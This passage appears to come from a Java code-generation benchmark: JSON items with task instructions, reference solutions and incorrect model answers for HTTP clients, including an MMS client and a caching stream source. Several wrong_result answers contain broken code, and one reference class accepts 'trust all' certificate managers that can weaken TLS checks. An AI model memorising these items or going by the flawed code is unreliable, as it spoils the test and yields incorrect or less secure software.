    "Canonical_solution": "import android.content.Context;\nimport com.android.mms.service_alt.exception.MmsHttpException;\nimport com.squareup.okhttp.ConnectionPool;\nimport com.squareup.okhttp.ConnectionSpec;\nimport com.squareup.okhttp.OkHttpClient;\nimport com.squareup.okhttp.Protocol;\nimport com.squareup.okhttp.Request;\nimport com.squareup.okhttp.Response;\nimport com.squareup.okhttp.internal.Internal;\nimport com.squareup.okhttp.internal.huc.HttpURLConnectionImpl;\nimport com.squareup.okhttp.internal.huc.HttpsURLConnectionImpl;\nimport timber.log.Timber;\n\nimport javax.net.SocketFactory;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.ProtocolException;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class MmsHttpClient {\n\n    public static final String METHOD_POST = \"POST\";\n    public static final String METHOD_GET = \"GET\";\n\n    private static final String HEADER_CONTENT_TYPE = \"Content-Type\";\n    private static final String HEADER_ACCEPT = \"Accept\";\n    private static final String HEADER_ACCEPT_LANGUAGE = \"Accept-Language\";\n    private static final String HEADER_USER_AGENT = \"User-Agent\";\n\n    private static final String HEADER_VALUE_ACCEPT =\n            \"*/*, application/vnd.wap.mms-message, application/vnd.wap.sic\";\n    private static final String HEADER_VALUE_CONTENT_TYPE_WITH_CHARSET =\n            \"application/vnd.wap.mms-message; charset=utf-8\";\n    private static final String HEADER_VALUE_CONTENT_TYPE_WITHOUT_CHARSET =\n            \"application/vnd.wap.mms-message\";\n\n    private final Context mContext;\n    private final SocketFactory mSocketFactory;\n    private final MmsNetworkManager mHostResolver;\n    private final ConnectionPool mConnectionPool;\n\n    public MmsHttpClient(Context context, SocketFactory socketFactory, MmsNetworkManager hostResolver,\n            ConnectionPool connectionPool) {\n        mContext = context;\n        mSocketFactory = socketFactory;\n        mHostResolver = hostResolver;\n        mConnectionPool = connectionPool;\n    }\n\n    public byte[] execute(String urlString, byte[] pdu, String method, boolean isProxySet,\n            String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig)\n            throws MmsHttpException {\n        Timber.d(\"HTTP: \" + method + \" \" + urlString\n                + (isProxySet ? (\", proxy=\" + proxyHost + \":\" + proxyPort) : \"\")\n                + \", PDU size=\" + (pdu != null ? pdu.length : 0));\n        checkMethod(method);\n        HttpURLConnection connection = null;\n        try {\n            Proxy proxy = null;\n            if (isProxySet) {\n                proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));\n            }\n            final URL url = new URL(urlString);\n            connection = openConnection(url, proxy);\n            connection.setDoInput(true);\n            connection.setConnectTimeout(mmsConfig.getHttpSocketTimeout());\n            connection.setRequestProperty(HEADER_ACCEPT, HEADER_VALUE_ACCEPT);\n            connection.setRequestProperty(\n                    HEADER_ACCEPT_LANGUAGE, getCurrentAcceptLanguage(Locale.getDefault()));\n            final String userAgent = mmsConfig.getUserAgent();\n            Timber.i(\"HTTP: User-Agent=\" + userAgent);\n            connection.setRequestProperty(HEADER_USER_AGENT, userAgent);\n            final String uaProfUrlTagName = mmsConfig.getUaProfTagName();\n            final String uaProfUrl = mmsConfig.getUaProfUrl();\n            if (uaProfUrl != null) {\n                Timber.i(\"HTTP: UaProfUrl=\" + uaProfUrl);\n                connection.setRequestProperty(uaProfUrlTagName, uaProfUrl);\n            }\n            addExtraHeaders(connection, mmsConfig);\n            if (METHOD_POST.equals(method)) {\n                if (pdu == null || pdu.length < 1) {\n                    Timber.e(\"HTTP: empty pdu\");\n                    throw new MmsHttpException(0/*statusCode*/, \"Sending empty PDU\");\n                }\n                connection.setDoOutput(true);\n                connection.setRequestMethod(METHOD_POST);\n                if (mmsConfig.getSupportHttpCharsetHeader()) {\n                    connection.setRequestProperty(HEADER_CONTENT_TYPE,\n                            HEADER_VALUE_CONTENT_TYPE_WITH_CHARSET);\n                } else {\n                    connection.setRequestProperty(HEADER_CONTENT_TYPE,\n                            HEADER_VALUE_CONTENT_TYPE_WITHOUT_CHARSET);\n                }\n                logHttpHeaders(connection.getRequestProperties());\n                connection.setFixedLengthStreamingMode(pdu.length);\n                final OutputStream out = new BufferedOutputStream(connection.getOutputStream());\n                out.write(pdu);\n                out.flush();\n                out.close();\n            } else if (METHOD_GET.equals(method)) {\n                logHttpHeaders(connection.getRequestProperties());\n                connection.setRequestMethod(METHOD_GET);\n            }\n            final int responseCode = connection.getResponseCode();\n            final String responseMessage = connection.getResponseMessage();\n            Timber.d(\"HTTP: \" + responseCode + \" \" + responseMessage);\n            logHttpHeaders(connection.getHeaderFields());\n            if (responseCode / 100 != 2) {\n                throw new MmsHttpException(responseCode, responseMessage);\n            }\n            final InputStream in = new BufferedInputStream(connection.getInputStream());\n            final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();\n            final byte[] buf = new byte[4096];\n            int count = 0;\n            while ((count = in.read(buf)) > 0) {\n                byteOut.write(buf, 0, count);\n            }\n            in.close();\n            final byte[] responseBody = byteOut.toByteArray();\n            Timber.d(\"HTTP: response size=\"\n                    + (responseBody != null ? responseBody.length : 0));\n            return responseBody;\n        } catch (MalformedURLException e) {\n            Timber.e(e, \"HTTP: invalid URL \" + urlString);\n            throw new MmsHttpException(0/*statusCode*/, \"Invalid URL \" + urlString, e);\n        } catch (ProtocolException e) {\n            Timber.e(e, \"HTTP: invalid URL protocol \" + urlString);\n            throw new MmsHttpException(0/*statusCode*/, \"Invalid URL protocol \" + urlString, e);\n        } catch (IOException e) {\n            Timber.e(e, \"HTTP: IO failure\");\n            throw new MmsHttpException(0/*statusCode*/, e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(URL url, final Proxy proxy) throws MalformedURLException {\n        final String protocol = url.getProtocol();\n        OkHttpClient okHttpClient;\n        if (protocol.equals(\"http\")) {\n            okHttpClient = new OkHttpClient();\n            okHttpClient.setFollowRedirects(false);\n            okHttpClient.setProtocols(Arrays.asList(Protocol.HTTP_1_1));\n            okHttpClient.setProxySelector(new ProxySelector() {\n                @Override\n                public List<Proxy> select(URI uri) {\n                    if (proxy != null) {\n                        return Arrays.asList(proxy);\n                    } else {\n                        return new ArrayList<Proxy>();\n                    }\n                }\n\n                @Override\n                public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n                }\n            });\n            okHttpClient.setAuthenticator(new com.squareup.okhttp.Authenticator() {\n                @Override\n                public Request authenticate(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n\n                @Override\n                public Request authenticateProxy(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n            });\n            okHttpClient.setConnectionSpecs(Arrays.asList(ConnectionSpec.CLEARTEXT));\n            okHttpClient.setConnectionPool(new ConnectionPool(3, 60000));\n            okHttpClient.setSocketFactory(SocketFactory.getDefault());\n            Internal.instance.setNetwork(okHttpClient, mHostResolver);\n\n            if (proxy != null) {\n                okHttpClient.setProxy(proxy);\n            }\n\n            return new HttpURLConnectionImpl(url, okHttpClient);\n        } else if (protocol.equals(\"https\")) {\n            okHttpClient = new OkHttpClient();\n            okHttpClient.setProtocols(Arrays.asList(Protocol.HTTP_1_1));\n            HostnameVerifier verifier = HttpsURLConnection.getDefaultHostnameVerifier();\n            okHttpClient.setHostnameVerifier(verifier);\n            okHttpClient.setSslSocketFactory(HttpsURLConnection.getDefaultSSLSocketFactory());\n            okHttpClient.setProxySelector(new ProxySelector() {\n                @Override\n                public List<Proxy> select(URI uri) {\n                    return Arrays.asList(proxy);\n                }\n\n                @Override\n                public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n                }\n            });\n            okHttpClient.setAuthenticator(new com.squareup.okhttp.Authenticator() {\n                @Override\n                public Request authenticate(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n\n                @Override\n                public Request authenticateProxy(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n            });\n            okHttpClient.setConnectionSpecs(Arrays.asList(ConnectionSpec.CLEARTEXT));\n            okHttpClient.setConnectionPool(new ConnectionPool(3, 60000));\n            Internal.instance.setNetwork(okHttpClient, mHostResolver);\n\n            return new HttpsURLConnectionImpl(url, okHttpClient);\n        } else {\n            throw new MalformedURLException(\"Invalid URL or unrecognized protocol \" + protocol);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.content.Context;\nimport android.net.http.AndroidHttpClient;\nimport android.os.Build;\nimport android.util.Log;\n\nimport org.apache.http.Header;\nimport org.apache.http.HttpHost;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.client.methods.HttpPost;\nimport org.apache.http.conn.params.ConnRoutePNames;\nimport org.apache.http.conn.scheme.PlainSocketFactory;\nimport org.apache.http.conn.scheme.Scheme;\nimport org.apache.http.conn.scheme.SchemeRegistry;\nimport org.apache.http.conn.ssl.SSLSocketFactory;\nimport org.apache.http.impl.client.DefaultHttpClient;\nimport org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;\nimport org.apache.http.params.BasicHttpParams;\nimport org.apache.http.params.HttpConnectionParams;\nimport org.apache.http.params.HttpParams;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Locale;\nimport java.util.Map;\n\npublic class MmsHttpClient {\n    private static final String TAG = \"MmsHttpClient\";\n    private Context mContext;\n    private SocketFactory mSocketFactory;\n    private MmsNetworkManager mHostResolver;\n    private ConnectionPool mConnectionPool;\n\n    public MmsHttpClient(Context context, SocketFactory socketFactory, MmsNetworkManager hostResolver, ConnectionPool connectionPool) {\n        this.mContext = context;\n        this.mSocketFactory = socketFactory;\n        this.mHostResolver = hostResolver;\n        this.mConnectionPool = connectionPool;\n    }\n\n    public byte[] execute(String urlString, byte[] pdu, String method, boolean isProxySet, String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig) throws IOException {\n        checkMethod(method);\n        URL url = new URL(urlString);\n\n        Proxy proxy = null;\n        if (isProxySet) {\n            proxy = new Proxy(Proxy.Type.HTTP, InetSocketAddress.createUnresolved(proxyHost, proxyPort));\n        }\n\n        HttpURLConnection conn = openConnection(url, proxy);\n        conn.setRequestMethod(method);\n\n        addExtraHeaders(conn, mmsConfig);\n\n        if (\"POST\".equalsIgnoreCase(method)) {\n            conn.setDoOutput(true);\n            try (OutputStream out = conn.getOutputStream()) {\n                out.write(pdu);\n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try (InputStream in = conn.getInputStream()) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                baos.write(buffer, 0, bytesRead);\n            }\n        }\n\n        logHttpHeaders(conn.getHeaderFields());\n\n        return baos.toByteArray();\n    }\n\n    public HttpURLConnection openConnection(URL url, Proxy proxy) throws MalformedURLException {\n        String protocol = url.getProtocol();\n        if (!\"http\".equals(protocol) && !\"https\".equals(protocol)) {\n            throw new MalformedURLException(\"Unsupported protocol: \" + protocol);\n        }\n\n        try {\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {\n                return (HttpURLConnection) url.openConnection(proxy);\n            } else {\n                // For older Android versions using Apache HttpClient\n                DefaultHttpClient httpClient = createHttpClient(proxy);\n                if (\"GET\".equals(url.getRequest())) {\n                    return (HttpURLConnection) new HttpGet(url.toString()).execute(httpClient).getEntity().getContent();\n                } else {\n                    return (HttpURLConnection) new HttpPost(url.toString()).execute(httpClient).getEntity().getContent();\n                }\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"Error opening HTTP connection\", e);\n            throw new RuntimeException(e);\n        }\n    }\n\n    private DefaultHttpClient createHttpClient(Proxy proxy) {\n        HttpParams params = new BasicHttpParams();\n        HttpConnectionParams.setConnectionTimeout(params, 30000);\n        HttpConnectionParams.setSoTimeout(params, 30000);\n\n        SchemeRegistry schemeRegistry = new SchemeRegistry();\n        schemeRegistry.register(new Scheme(\"http\", PlainSocketFactory.getSocketFactory(), 80));\n        schemeRegistry.register(new Scheme(\"https\", SSLSocketFactory.getSocketFactory(), 443));\n\n        ThreadSafeClientConnManager cm = new ThreadSafeClientConnManager(params, schemeRegistry);\n        DefaultHttpClient httpClient = new DefaultHttpClient(cm, params);\n\n        if (proxy != null) {\n            HttpHost proxyHost = new HttpHost(((InetSocketAddress) proxy.address()).getHostName(), ((InetSocketAddress) proxy.address()).getPort());\n            httpClient.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY, proxyHost);\n        }\n\n        return httpClient;\n    }\n\n    public void checkMethod(String method) {\n        if (!\"GET\".equalsIgnoreCase(method) && !\"POST\".equalsIgnoreCase(method)) {\n            throw new IllegalArgumentException(\"Unsupported HTTP method: \" + method);\n        }\n    }\n\n    public String getCurrentAcceptLanguage(Locale locale) {\n        StringBuilder acceptLanguage = new StringBuilder();\n        if (locale != null) {\n            String language = locale.getLanguage();\n            String country = locale.getCountry();\n            if (country.length() > 0) {\n                acceptLanguage.append(language).append('-').append(country);\n            } else {\n                acceptLanguage.append(language);\n            }\n            acceptLanguage.append(\";q=1.0\");\n        }\n        return acceptLanguage.toString();\n    }\n\n    public void addExtraHeaders(HttpURLConnection connection, MmsConfig.Overridden mmsConfig) {\n        connection.setRequestProperty(\"User-Agent\", \"Android-Mms/1.0\");\n        connection.setRequestProperty(\"Content-Type\", \"application/vnd.wap.mms-message\");\n        connection.setRequestProperty(\"X-Wap-Application-Id\", \"10001\");\n\n        if (mmsConfig != null) {\n            if (mmsConfig.getTransactionId() != null) {\n                connection.setRequestProperty(\"X-Transaction-ID\", mmsConfig.getTransactionId());\n            }\n            if (mmsConfig.getMessageId() != null) {\n                connection.setRequestProperty(\"X-Message-ID\", mmsConfig.getMessageId());\n            }\n        }\n    }\n\n    public void logHttpHeaders(Map<String, List<String>> headers) {\n        for (Map.Entry<String, List<String>> entry : headers.entrySet()) {\n            Log.d(TAG, entry.getKey() + \": \" + entry.getValue());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 77,
    "Instruction": "Task Description: Create a Java class that handles HTTP POST requests to a specified URL, with callback functionality for success and failure cases.\n\nClass Description: The HttpRequestHandler class is responsible for sending HTTP POST requests to a predefined URL. It encapsulates the connection setup, request parameter encoding, and response handling, providing callback methods to notify the caller of the request outcome.\n\nAttributes:\n- packageName: String - The package name to be sent as a parameter in the POST request\n- callback: OnRequestCallback - The callback interface to handle request success or failure\n\nMethods:\n- sendPostRequest(): void - Sends a POST request to the configured URL with the packageName as a parameter. Handles connection setup, timeout configuration, request writing, and response processing. Notifies the callback of success or failure.\n- HttpRequestHandler(String, OnRequestCallback): Constructor - Initializes the handler with a package name and callback interface\n\nInterface:\n- OnRequestCallback: Interface defining callback methods for request outcomes\n  - onSuccess(): void - Called when the request succeeds (response code < 400)\n  - onFailure(Exception): void - Called when the request fails (response code >= 400 or IO exception occurs)",
    "Canonical_solution": "import java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class HttpRequestHandler {\n\n    private String packageName;\n    private OnRequestCallback callback;\n\n    public HttpRequestHandler(String packageName, OnRequestCallback callback) {\n        this.packageName = packageName;\n        this.callback = callback;\n    }\n\n    public void sendPostRequest() {\n        try {\n            URL url = new URL(\"https://www.freelinebuild.com/api/feedback/app\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setReadTimeout(10000);\n            conn.setConnectTimeout(15000);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoInput(true);\n            conn.setDoOutput(true);\n\n            StringBuilder builder = new StringBuilder();\n            builder.append(URLEncoder.encode(\"pkg\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(packageName, \"UTF-8\"));\n\n            OutputStream os = conn.getOutputStream();\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n            writer.write(builder.toString());\n            writer.flush();\n            writer.close();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                this.callback.onFailure(new Exception(conn.getResponseMessage()));\n            } else {\n                this.callback.onSuccess();\n            }\n            conn.disconnect();\n        } catch (IOException e) {\n            this.callback.onFailure(e);\n        }\n    }\n\n    public interface OnRequestCallback {\n        void onSuccess();\n        void onFailure(Exception e);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\npublic class HttpRequestHandler {\n    private String packageName;\n    private OnRequestCallback callback;\n\n    public HttpRequestHandler(String packageName, OnRequestCallback callback) {\n        this.packageName = packageName;\n        this.callback = callback;\n    }\n\n    public void sendPostRequest() {\n        try {\n            java.net.URL url = new java.net.URL(\"http://example.com/api\");\n            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout(5000);\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            String postData = \"packageName=\" + java.net.URLEncoder.encode(packageName, \"UTF-8\");\n            try (java.io.OutputStream os = conn.getOutputStream()) {\n                byte[] input = postData.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode < 400) {\n                callback.onSuccess();\n            } else {\n                callback.onFailure(new Exception(\"HTTP error code: \" + responseCode));\n            }\n        } catch (Exception e) {\n            callback.onFailure(e);\n        }\n    }\n\n    public interface OnRequestCallback {\n        void onSuccess();\n\n        void onFailure(Exception e);\n    }\n}\n```"
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a Java function that sends an HTTP POST request to a specified URL with a given message, verifies the response status code, and compares the response content with the original message.\n\nFunction Description: The function establishes an HTTP connection using HttpURLConnection, sends a POST request with the provided message as the request body, reads the response, and asserts that the response status code is OK (200) and that the response content matches the original message. If the response doesn't match, it prints the hexadecimal representation of the response.\n\nInput: \n- message: String - The message to be sent in the request body\n- url: String - The endpoint path to which the request is sent (appended to a base URL)\n\nOutput: \n- None (void) - The function performs assertions and may print debug information but doesn't return any value\n- Throws: IOException - If any I/O error occurs during the HTTP communication",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate void runTestViaJavaImpl(final String message, String url) throws IOException {\n    HttpURLConnection urlcon = null;\n    try {\n        String uri = getBaseUrl() + \"/servletContext/\" + url;\n        urlcon = (HttpURLConnection) new URL(uri).openConnection();\n        urlcon.setInstanceFollowRedirects(true);\n        urlcon.setRequestProperty(\"Connection\", \"close\");\n        urlcon.setRequestMethod(\"POST\");\n        urlcon.setDoInput(true);\n        urlcon.setDoOutput(true);\n        OutputStream os = urlcon.getOutputStream();\n        os.write(message.getBytes());\n        os.close();\n        Assert.assertEquals(StatusCodes.OK, urlcon.getResponseCode());\n        InputStream is = urlcon.getInputStream();\n\n        ByteArrayOutputStream bytes = new ByteArrayOutputStream();\n        byte[] buf = new byte[256];\n        int len;\n        while ((len = is.read(buf)) > 0) {\n            bytes.write(buf, 0, len);\n        }\n        is.close();\n        final String response = new String(bytes.toByteArray(), 0, bytes.size());\n        if (!message.equals(response)) {\n            System.out.println(String.format(\"response=%s\", Hex.encodeHexString(response.getBytes())));\n        }\n        Assert.assertEquals(message, response);\n    } finally {\n        if (urlcon != null) {\n            urlcon.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClientValidator {\n    private static final String BASE_URL = \"http://example.com\"; // Replace with actual base URL\n\n    public void sendAndVerify(String message, String url) throws IOException {\n        URL fullUrl = new URL(BASE_URL + url);\n        HttpURLConnection connection = (HttpURLConnection) fullUrl.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", \"application/octet-stream\");\n\n        try (OutputStream os = connection.getOutputStream()) {\n            os.write(message.getBytes());\n        }\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n\n        try (InputStream is = connection.getInputStream();\n             ByteArrayOutputStream buffer = new ByteArrayOutputStream()) {\n\n            byte[] data = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(data, 0, data.length)) != -1) {\n                buffer.write(data, 0, bytesRead);\n            }\n            buffer.flush();\n\n            byte[] responseBytes = buffer.toByteArray();\n            String responseMessage = new String(responseBytes);\n\n            if (!message.equals(responseMessage)) {\n                StringBuilder hexBuilder = new StringBuilder();\n                for (byte b : responseBytes) {\n                    hexBuilder.append(String.format(\"%02X \", b));\n                }\n                System.out.println(\"Response content mismatch. Hex dump: \" + hexBuilder.toString().trim());\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 79,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for streaming content with support for caching, custom headers, and SSL verification.\n\nClass Description: HttpUrlSource is a class that provides HTTP content streaming functionality with features like range requests, redirect handling, SSL customization, and header injection. It's designed to work with a caching system and stores source information (URL, length, MIME type) persistently.\n\nAttributes:\n- sourceInfoStorage: SourceInfoStorage - Stores and retrieves source information (URL, length, MIME type)\n- headerInjector: HeaderInjector - Injects custom headers into HTTP requests\n- v: HostnameVerifier - Custom hostname verifier for SSL connections\n- trustAllCerts: TrustManager[] - Custom trust managers for SSL connections\n- sourceInfo: SourceInfo - Contains URL, content length and MIME type information\n- connection: HttpURLConnection - Active HTTP connection\n- inputStream: InputStream - Stream for reading content\n\nMethods:\n- HttpUrlSource(String, HostnameVerifier, TrustManager[]) -> void - Constructor with URL, hostname verifier and trust managers\n- HttpUrlSource(String, SourceInfoStorage, HostnameVerifier, TrustManager[]) -> void - Constructor with additional source info storage\n- HttpUrlSource(String, SourceInfoStorage, HeaderInjector, HostnameVerifier, TrustManager[]) -> void - Full constructor with all dependencies\n- length() -> long - Returns content length, fetches if not known\n- open(long) -> void - Opens connection at specified offset\n- close() -> void - Closes current connection\n- read(byte[]) -> int - Reads data into buffer\n- getMime() -> String - Returns MIME type, fetches if not known\n- getUrl() -> String - Returns source URL\n- openConnection(long, int) -> HttpURLConnection - Internal method to open connection with offset and timeout\n- injectCustomHeaders(HttpURLConnection, String) -> void - Injects custom headers into connection\n- readSourceAvailableBytes(HttpURLConnection, long, int) -> long - Calculates available bytes based on response\n- getContentLength(HttpURLConnection) -> long - Extracts content length from headers\n- fetchContentInfo() -> void - Fetches content information (length and MIME type)",
    "Canonical_solution": "import com.danikula.videocache.headers.EmptyHeadersInjector;\nimport com.danikula.videocache.headers.HeaderInjector;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorage;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorageFactory;\n\nimport java.io.BufferedInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InterruptedIOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Map;\n\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\n\npublic class HttpUrlSource implements Source {\n\n    private static final int MAX_REDIRECTS = 5;\n    private final SourceInfoStorage sourceInfoStorage;\n    private final HeaderInjector headerInjector;\n    private final HostnameVerifier v;\n    private final TrustManager[] trustAllCerts;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(String url, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this(url, SourceInfoStorageFactory.newEmptySourceInfoStorage(), v, trustAllCerts);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this(url, sourceInfoStorage, new EmptyHeadersInjector(), v, trustAllCerts);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this.sourceInfoStorage = sourceInfoStorage;\n        this.headerInjector = headerInjector;\n        this.v = v;\n        this.trustAllCerts = trustAllCerts;\n        SourceInfo sourceInfo = sourceInfoStorage.get(url);\n        this.sourceInfo = sourceInfo != null ? sourceInfo :\n            new SourceInfo(url, Integer.MIN_VALUE, ProxyCacheUtils.getSupposablyMime(url));\n    }\n\n    @Override\n    public synchronized long length() throws ProxyCacheException {\n        if (sourceInfo.length == Integer.MIN_VALUE) {\n            fetchContentInfo();\n        }\n        return sourceInfo.length;\n    }\n\n    @Override\n    public void open(long offset) throws ProxyCacheException {\n        try {\n            connection = openConnection(offset, -1);\n            String mime = connection.getContentType();\n            inputStream = new BufferedInputStream(connection.getInputStream(), DEFAULT_BUFFER_SIZE);\n            long length = readSourceAvailableBytes(connection, offset, connection.getResponseCode());\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error opening connection for \" + sourceInfo.url + \" with offset \" + offset, e);\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) throws IOException {\n        long contentLength = getContentLength(connection);\n        return responseCode == HTTP_OK ? contentLength\n            : responseCode == HTTP_PARTIAL ? contentLength + offset : sourceInfo.length;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthValue = connection.getHeaderField(\"Content-Length\");\n        return contentLengthValue == null ? -1 : Long.parseLong(contentLengthValue);\n    }\n\n    @Override\n    public void close() throws ProxyCacheException {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (NullPointerException | IllegalArgumentException e) {\n                throw new RuntimeException(\"Error closing connection\", e);\n            }\n        }\n    }\n\n    @Override\n    public int read(byte[] buffer) throws ProxyCacheException {\n        if (inputStream == null) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url + \": connection is absent!\");\n        }\n        try {\n            return inputStream.read(buffer, 0, buffer.length);\n        } catch (InterruptedIOException e) {\n            throw new InterruptedProxyCacheException(\"Reading source \" + sourceInfo.url + \" is interrupted\", e);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url, e);\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException, ProxyCacheException {\n        HttpURLConnection connection;\n        boolean redirected;\n        int redirectCount = 0;\n        String url = this.sourceInfo.url;\n        do {\n            if (url.startsWith(\"https\") && v != null && trustAllCerts != null) {\n                connection = (HttpURLConnection) new URL(url).openConnection();\n                ((HttpsURLConnection) connection).setHostnameVerifier(v);\n                try {\n                    SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n                    sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n                    SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();\n                    ((HttpsURLConnection) connection).setSSLSocketFactory(sslSocketFactory);\n                    ((HttpsURLConnection) connection).setHostnameVerifier(v);\n                } catch (NoSuchAlgorithmException | KeyManagementException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                connection = (HttpURLConnection) new URL(url).openConnection();\n            }\n            injectCustomHeaders(connection, url);\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            int code = connection.getResponseCode();\n            redirected = code == HTTP_MOVED_PERM || code == HTTP_MOVED_TEMP || code == HTTP_SEE_OTHER;\n            if (redirected) {\n                url = connection.getHeaderField(\"Location\");\n                redirectCount++;\n                connection.disconnect();\n            }\n            if (redirectCount > MAX_REDIRECTS) {\n                throw new ProxyCacheException(\"Too many redirects: \" + redirectCount);\n            }\n        } while (redirected);\n        return connection;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        Map<String, String> extraHeaders = headerInjector.addHeaders(url);\n        if (extraHeaders == null) {\n            return;\n        }\n        for (Map.Entry<String, String> header : extraHeaders.entrySet()) {\n            connection.setRequestProperty(header.getKey(), header.getValue());\n        }\n    }\n\n    public synchronized String getMime() throws ProxyCacheException {\n        if (TextUtils.isEmpty(sourceInfo.mime)) {\n            fetchContentInfo();\n        }\n        return sourceInfo.mime;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
